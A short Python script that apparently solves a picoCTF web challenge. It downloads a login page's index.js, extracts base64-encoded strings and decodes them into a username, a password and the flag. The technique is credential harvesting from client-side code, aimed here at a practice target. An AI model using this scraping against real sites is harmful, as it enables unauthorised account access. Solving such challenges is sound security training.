import requests
import base64
import re

def extract_strings(input_string):
    pattern = r'(YWR\w*|cGljb\w*)'
    extracted_strings = re.findall(pattern, input_string)
    return extracted_strings

def decode_base64(encoded_string):
    # Calculate the padding required
    padding = len(encoded_string) % 4
    if padding != 0:
        padding_required = 4 - padding
        encoded_string += '=' * padding_required
    
    decoded_bytes = base64.b64decode(encoded_string)
    decoded_string = decoded_bytes.decode('utf-8')
    return decoded_string

url = "https://login.mars.picoctf.net"
js_path = "/index.js"

r = requests.get(url + js_path)

credential = []

for i in extract_strings(r.text):
	decoded_result = decode_base64(i)
	credential.append(decoded_result)

print("\t[+] staring attack")
print(f"\t[+] username  -> {credential[0]}")
print(f"\t[+] password  -> {credential[1]}")
print(f"\t[+] your flag -> {credential[1]}")
